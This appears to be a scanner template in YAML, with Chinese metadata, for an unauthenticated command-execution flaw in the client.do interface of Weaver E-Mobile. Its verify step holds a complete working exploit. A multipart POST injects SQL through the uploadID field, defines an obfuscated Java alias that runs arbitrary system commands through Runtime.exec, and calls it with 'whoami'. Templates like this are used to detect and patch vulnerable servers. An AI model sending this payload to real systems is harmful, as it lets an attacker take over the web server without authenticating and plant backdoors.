app: Weaver
query: app:"Weaver"
meta:
  name: 泛微E-Mobile命令执行漏洞
  level: 4
  tags:
  - remote_code_execution
  description: 泛微E-Mobile中client.do接口存在命令执行漏洞，未经身份验证的攻击者可以利用此漏洞执行任意指令，写入后门文件，导致整个web服务器存在被控的风险。
  homepage: ""
  author: X prism
  references: ""
  solution: 目前官方已发布漏洞修复版本，建议用户升级到安全版本：
  create_at: "2024-07-13 12:39:42"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /client.do
          redirect: true
          header:
          - Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTm8YXcJeyKDClbU7
          params: |-
            ------WebKitFormBoundaryTm8YXcJeyKDClbU7
                    Content-Disposition: form-data; name="method"

                    getupload
                    ------WebKitFormBoundaryTm8YXcJeyKDClbU7
                    Content-Disposition: form-data; name="uploadID"

                    1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagmf('whoami');--
                    ------WebKitFormBoundaryTm8YXcJeyKDClbU7--
        response:
        - name: body
          value: system
          type: contains
        - name: code
          value: "200"
          type: equals
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
